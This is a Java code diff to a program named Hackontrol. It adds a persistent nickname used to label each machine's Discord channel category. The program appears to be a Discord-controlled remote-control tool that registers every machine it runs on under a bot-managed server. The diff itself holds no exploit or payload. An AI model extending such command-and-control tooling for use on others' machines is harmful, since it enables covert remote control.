@@ -11,6 +11,7 @@ import com.khopan.hackontrol.logger.HackontrolLoggerConfig;
 import com.khopan.hackontrol.manager.Manager;
 import com.khopan.hackontrol.module.Module;
 import com.khopan.hackontrol.persistent.PersistentStorage;
+import com.khopan.hackontrol.persistent.builtin.StringPresistent;
 import com.khopan.hackontrol.persistent.file.FilePersistentStorage;
 import com.khopan.hackontrol.registration.ManagerRegistry;
 import com.khopan.hackontrol.registration.ModuleRegistry;
@@ -35,12 +36,14 @@ public class Hackontrol {
 
 	public static final Logger LOGGER;
 	public static final long STARTUP_TIME;
+	public static final String PERSISTENT_NICKNAME;
 
 	private static Hackontrol INSTANCE;
 
 	static {
 		STARTUP_TIME = System.currentTimeMillis();
 		NativeLibrary.load();
+		PERSISTENT_NICKNAME = "nickname";
 		MANAGER_REGISTRY = RegistryType.create();
 		MODULE_REGISTRY = RegistryType.create();
 		LOGGER = LoggerFactory.getLogger("Hackontrol");
@@ -85,7 +88,8 @@ public class Hackontrol {
 
 		this.guild = this.bot.getGuildById(1173967259304198154L);
 		this.machineIdentifier = Machine.getIdentifier();
-		this.category = this.getOrCreateCategory(this.guild, this.machineIdentifier);
+		StringPresistent persistent = this.persistentStorage.load(Hackontrol.PERSISTENT_NICKNAME, StringPresistent.class);
+		this.category = this.getOrCreateCategory(this.guild, this.getName(persistent.value));
 
 		for(int i = 0; i < this.moduleList.size(); i++) {
 			Module module = this.moduleList.get(i);
@@ -107,6 +111,14 @@ public class Hackontrol {
 			Hackontrol.LOGGER.info("Initializing manager: {}", manager.getClass().getName());
 			manager.initialize();
 		}
+	}
+
+	private String getName(String name) {
+		if(name == null || name.isEmpty()) {
+			return this.machineIdentifier;
+		}
+
+		return name + " - " + this.machineIdentifier;
 	}
 
 	private Category getOrCreateCategory(Guild guild, String name) {
@@ -238,8 +250,23 @@ public class Hackontrol {
 		return this.handler;
 	}
 
+	public String getNickname() {
+		StringPresistent persistent = this.persistentStorage.load(Hackontrol.PERSISTENT_NICKNAME, StringPresistent.class);
+		return persistent.value;
+	}
+
 	public void setErrorHandler(ErrorHandler handler) {
 		this.handler = handler;
+	}
+
+	public void setNickname(String nickname) {
+		this.category.getManager().setName(this.getName(nickname)).queue(empty -> {
+			StringPresistent persistent = new StringPresistent();
+			persistent.value = nickname;
+			this.persistentStorage.save(Hackontrol.PERSISTENT_NICKNAME, persistent, StringPresistent.class);
+		}, throwable -> {
+			this.handleError(Thread.currentThread(), throwable);
+		});
 	}
 
 	public static void main(String[] args) throws Throwable {
